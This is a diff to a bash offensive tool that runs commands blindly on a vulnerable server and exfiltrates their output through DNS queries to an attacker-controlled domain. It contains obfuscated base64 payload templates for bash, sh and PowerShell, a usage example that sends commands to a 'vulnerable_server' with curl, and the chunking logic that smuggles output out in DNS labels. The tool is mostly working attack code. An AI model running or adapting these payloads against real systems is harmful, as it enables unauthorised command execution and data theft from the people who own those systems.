@@ -3,10 +3,9 @@
 nlabels=4
 label_size=30
 debug=0
-mode=0 #bash or powershell
+shell=bash #bash, sh or powershell
 strict_label_charset=1
 outfile=/dev/stdout
-oci=0
 
 trap "setsid kill -2 -- -$(ps -o pgid= $$ | grep -o [0-9]*)" EXIT
 
@@ -24,18 +23,14 @@ Usage:
     -n NLABELS=4        The number of labels to use for the data exfiltration. data1.data2...dataN.uid.yourdns.ns
     -s LABEL_SIZE=30    The size of each label. len(data1)
     -o FILE=stdout      The file where the command output will be stored
-    -w                  Switch to powershell mode. Defaults to bash
+    -w SHELL=bash       Supported shells are bash, sh, powershell|ps
     -r                  No encoding of +/= characters before issuing dns requests
     -v                  Verbose mode
     
     Examples:
-    stdbuf -oL tcpdump --immediate -l -i any udp port 53|$0 -h whatev.er -d "dig @0 +tries=5" -x ./dispatcher.sh -- 'ls -lha|grep secret'
-    cat dispatcher.sh: 
-        \$@
+    stdbuf -oL tcpdump --immediate -l -i any udp port 53|$0 -h whatev.er -d "dig @0 +tries=5" -x dispatcher_examples/local_bash.sh -- 'ls -lha|grep secret'
     
-    $0 -h youdns.ns -w -d "Resolve-DnsName" -x ./dispatcher.sh -- 'gci | % {\$_.Name}' < <(stdbuf -oL ssh user@HOST 'sudo tcpdump --immediate -l udp port 53')
-    cat dispatcher.sh
-        curl https://vulnerable_server --data-urlencode "cmd=\${1}"
+    $0 -h youdns.ns -w ps -d "Resolve-DnsName" -x ./dispatcher.sh -- 'gci | % {\$_.Name}' < <(stdbuf -oL ssh user@HOST 'sudo tcpdump --immediate -l udp port 53')
 !
 }
 
@@ -46,7 +41,7 @@ function debug_print {
 function b64 {
     local target_enc="UTF-8"
     
-    [[ $mode -eq 1 ]] && target_enc=UTF-16LE
+    [[ $shell == powershell ]] && target_enc=UTF-16LE
     if [[ $1 == -d ]]; then
         base64 -d
     else
@@ -81,11 +76,7 @@ function strict_translator {
 }
 
 function assign {
-    [[ $1 == bash && $mode == 0 ]] && {
-        declare -g "$2"="$3"
-    }
-    
-    [[ $1 == powershell && $mode == 1 ]] && {
+    [[ $1 == "$shell" ]] && {
         declare -g "$2"="$3"
     }
 }
@@ -133,8 +124,9 @@ while [[ $# -gt 0 ]]; do
         shift
         shift
         ;;
-        -w) #powershell
-        mode=1 
+        -w)
+        shell="$2"
+        shift
         shift
         ;;
         -r|--relaxed)
@@ -168,17 +160,25 @@ for arg in "${mandatory_args[@]}"; do
     [[ -z ${!arg} ]] && echo "Missing arg: $arg" && exit
 done
 
+[[ $shell == ps ]] && shell=powershell
+
+supported_shells=(sh bash bash2 powershell)
+[[ -z $(IFS=@;[[ @"${supported_shells[*]}"@ == *@"$shell"@* ]] && echo yes) ]] && {
+    echo "$shell is not supported"
+    echo "Currently supported shells: ${supported_shells[*]}"
+    exit
+}
+
 YELLOW='\033[0;33m'
 RED='\033[0;31m'
 NC='\033[0m'
-[[ $mode -eq 0 ]] && printf "${YELLOW}******BASH******${NC}\n"
-[[ $mode -eq 1 ]] && printf "${YELLOW}******POWERSHELL*******${NC}\n"
+printf "${YELLOW}******${shell^^}******${NC}\n"
 printf "Dispatcher: ${YELLOW}%s${NC}\n" "$dispatcher"
 printf "Base DNS Host: ${YELLOW}%s${NC}\n" "$dns_host"
 printf "DNS Trigger Command: ${YELLOW}%s${NC}\n" "$dns_trigger"
 printf "Number of labels and label size: ${YELLOW}${nlabels}x${label_size}${NC}\n"
 [[ ! -x $dispatcher ]] && printf "${RED}Dispatcher file is not executable${NC}\n"
-[[ $strict_label_charset -ne 1 && $mode -eq 1 ]] && printf "${RED}Windows+Strict Label Charset OFF=?${NC}\n"
+[[ $strict_label_charset -ne 1 && $shell == powershell ]] && printf "${RED}Windows+Strict Label Charset OFF=?${NC}\n"
 [[ -t 0 ]] && printf "${RED}NS DNS data are expected through stdin, check usage examples${NC}\n"
 
 ##########END OF ARGUMENT PROCESSING#############
@@ -186,18 +186,27 @@ printf "Number of labels and label size: ${YELLOW}${nlabels}x${label_size}${NC}\
 ##########server-side processing definitions#######
 
 #looks like different script would be more appropriate for implementing
-#the server side data extraction similar with: https://github.com/0xC01DF00D/Collabfiltrator
+#the full exfiltration logic on server side similar with: https://github.com/0xC01DF00D/Collabfiltrator
 #the below command should work for bash with support for parallelism through xargs
 #bash_cmd="(${cmd})|base64 -w0|sed 's_+_-1_g; s_/_-2_g; s_=_-3_g'|grep -Eo '.{1,%LABEL_SIZE%}'|xargs -P %THREADS% -n %NLABELS% bash -c 'IFS=.;echo %dns_trigger% \"\$*\".%STAGE_ID%%UNIQUE_DNS_HOST%' bash"
 
 #since powershell v7, we can add -Parallel and throttleLimit as parameters to foreach
 #powershell_cmd=[Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes((${cmd}))).split("(.{1,%LABEL_SIZExNLABELS%})")|?{$_}|%{%dns_trigger% $("{0}{1}" -f $_.replace("(.{1,%LABEL_SIZE%})",'$1.'),"%UNIQUE_DNS_HOST%")}
 
+##########sh definitions#######
+assign sh outer_cmd_template 'sh -c $@|base64${IFS}-d|sh . echo %CMD_B64%'
+
+assign sh innerdns_cmd_template ' %dns_trigger% %USER_CMD%.%STAGE_ID%%UNIQUE_DNS_HOST%'
+
+assign sh user_cmd_template "\`(${cmd})|base64 -w0|cut -b\$((%INDEX%+1))-\$((%INDEX%+%COUNT%))\`"
+[[ $strict_label_charset -eq 1 ]] && {
+    assign sh user_cmd_template "\`(${cmd})|base64 -w0|cut -b\$((%INDEX%+1))-\$((%INDEX%+%COUNT%))|sed 's_+_-1_g; s_/_-2_g; s_=_-3_g'\`"
+}
+
+assign sh user_cmd_out_len "\`(${cmd})|base64 -w0|wc -c\`"
+assign sh user_cmd_sep .
 ##########bash definitions#######
 assign bash outer_cmd_template 'bash -c {echo,%CMD_B64%}|{base64,-d}|bash'
-[[ $oci -eq 1 ]] && {
-    assign bash outer_cmd_template 'bash -c $@|base64${IFS}-d|bash . echo %CMD_B64%'
-}
 
 assign bash innerdns_cmd_template ' %dns_trigger% %USER_CMD%.%STAGE_ID%%UNIQUE_DNS_HOST%'
 
@@ -242,16 +251,16 @@ unique_dns_host="${run_uid}.${dns_host}"
 #extracting command output length
 echo -e "\nTrying to execute: \"${cmd}\""
 pre_innerdns_cmd=${innerdns_cmd_template}
-pre_innerdns_cmd=${pre_innerdns_cmd/'%dns_trigger%'/$dns_trigger}
-pre_innerdns_cmd=${pre_innerdns_cmd/'%UNIQUE_DNS_HOST%'/$unique_dns_host}
-pre_innerdns_cmd=${pre_innerdns_cmd/'%STAGE_ID%'/len}
-innerdns_cmd=${pre_innerdns_cmd/'%USER_CMD%'/${user_cmd_out_len}}
+pre_innerdns_cmd=${pre_innerdns_cmd//'%dns_trigger%'/$dns_trigger}
+pre_innerdns_cmd=${pre_innerdns_cmd//'%UNIQUE_DNS_HOST%'/$unique_dns_host}
+pre_innerdns_cmd=${pre_innerdns_cmd//'%STAGE_ID%'/len}
+innerdns_cmd=${pre_innerdns_cmd//'%USER_CMD%'/${user_cmd_out_len}}
 debug_print "innerdns_cmd=$innerdns_cmd"
 
 cmd_b64=$(echo "$innerdns_cmd"|b64)
 debug_print "cmd_b64=$cmd_b64"
 
-outer_cmd=${outer_cmd_template/'%CMD_B64%'/$cmd_b64}
+outer_cmd=${outer_cmd_template//'%CMD_B64%'/$cmd_b64}
 debug_print "outer_cmd[${#outer_cmd}]=$outer_cmd"
 
 "$dispatcher" "$outer_cmd" >/dev/null 2>&1 &
@@ -267,25 +276,25 @@ echo "The command output length is: $cmd_out_len"
 
 #extracting the command output
 pre_innerdns_cmd=${innerdns_cmd_template}
-pre_innerdns_cmd=${pre_innerdns_cmd/'%dns_trigger%'/$dns_trigger}
-pre_innerdns_cmd=${pre_innerdns_cmd/'%UNIQUE_DNS_HOST%'/$unique_dns_host}
+pre_innerdns_cmd=${pre_innerdns_cmd//'%dns_trigger%'/$dns_trigger}
+pre_innerdns_cmd=${pre_innerdns_cmd//'%UNIQUE_DNS_HOST%'/$unique_dns_host}
 cmd_out=""
 for ((index_base=0;index_base<${cmd_out_len};index_base+=${nlabels}*${label_size}));do
-    innerdns_cmd=${pre_innerdns_cmd/'%STAGE_ID%'/iter${index_base}}
+    innerdns_cmd=${pre_innerdns_cmd//'%STAGE_ID%'/iter${index_base}}
     for index in `seq $((index_base)) ${label_size} $((index_base+(nlabels-1)*label_size))`;do
         [[ $index -ge $cmd_out_len ]] && break
         count=$(((cmd_out_len-index)>label_size?label_size:cmd_out_len-index))
-        user_cmd=${user_cmd_template/'%INDEX%'/${index}}
-        user_cmd=${user_cmd/'%COUNT%'/${count}}
-        innerdns_cmd=${innerdns_cmd/'%USER_CMD%'/${user_cmd}${user_cmd_sep}'%USER_CMD%'}
+        user_cmd=${user_cmd_template//'%INDEX%'/${index}}
+        user_cmd=${user_cmd//'%COUNT%'/${count}}
+        innerdns_cmd=${innerdns_cmd//'%USER_CMD%'/${user_cmd}${user_cmd_sep}'%USER_CMD%'}
     done
-    innerdns_cmd=${innerdns_cmd/${user_cmd_sep}'%USER_CMD%'}
+    innerdns_cmd=${innerdns_cmd//${user_cmd_sep}'%USER_CMD%'}
     debug_print "$innerdns_cmd"
     
     cmd_b64=$(echo "$innerdns_cmd"|b64)
     debug_print "cmd_b64=$cmd_b64"
 
-    outer_cmd=${outer_cmd_template/'%CMD_B64%'/$cmd_b64}
+    outer_cmd=${outer_cmd_template//'%CMD_B64%'/$cmd_b64}
     debug_print "outer_cmd[${#outer_cmd}]=$outer_cmd"
     
     "$dispatcher" "$outer_cmd" >/dev/null 2>&1 &
@@ -298,3 +307,4 @@ for ((index_base=0;index_base<${cmd_out_len};index_base+=${nlabels}*${label_size
 done && echo
 
 echo "$cmd_out" | tr -d . | strict_translator -d | b64 -d >> "$outfile"
+echo
